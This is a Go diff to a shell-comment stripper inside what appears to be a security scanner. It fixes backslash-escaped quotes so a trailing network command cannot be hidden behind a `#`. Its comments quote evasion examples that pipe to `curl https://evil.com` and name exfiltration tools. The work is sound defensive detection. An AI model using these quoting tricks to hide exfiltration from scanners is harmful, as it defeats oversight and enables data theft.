@@ -129,7 +129,14 @@ func networkReason(kind FileKind, hasCmd, hasURL bool) string {
 // single (`'`) and double (`"`) quote state while scanning, so a `#` inside a
 // quoted string (e.g. `echo "x # " && curl https://evil.com`) is NOT treated
 // as a comment start and the trailing real command is preserved — an attacker
-// can no longer hide a curl/wget/nc/scp/ssh exfil behind a quoted `#`. A `#`
+// can no longer hide a curl/wget/nc/scp/ssh exfil behind a quoted `#`. It is
+// ALSO backslash-aware inside double-quoted strings: a `\"` is a literal `"`
+// in real shell (a backslash only escapes `$`, backtick, `"`, `\`, newline
+// inside double quotes), NOT a string terminator, so the escaped `"` is
+// skipped and does not toggle the quote state — otherwise `echo "\" # " &&
+// curl https://evil.com` would close the string at `\"`, mistake the trailing
+// `#` for a comment, and hide the curl exfil. A backslash is literal inside
+// single quotes, so only double-quoted strings skip the escaped char. A `#`
 // embedded mid-token (`echo a#b`) is not a shell comment and is preserved.
 // Shebangs (`#!/bin/sh`) and inline notes (`cmd # note`) both strip cleanly.
 // This only ever removes prose, never a real network call, so a command word
@@ -139,6 +146,16 @@ func stripShellComment(line string) string {
 	var inSingle, inDouble bool
 	for i := 0; i < len(line); i++ {
 		switch line[i] {
+		case '\\':
+			// Inside a double-quoted string a backslash escapes the next char
+			// (e.g. `\"` is a literal `"`, NOT a string terminator). Skip the
+			// escaped char so the quote state stays correct — otherwise a `\"`
+			// would close the string and a following `#` would be mistaken for
+			// a comment, hiding a trailing exfil command. A backslash is
+			// literal inside single quotes, so only act when inDouble.
+			if inDouble && i+1 < len(line) {
+				i++ // skip the escaped char
+			}
 		case '\'':
 			if !inDouble {
 				inSingle = !inSingle
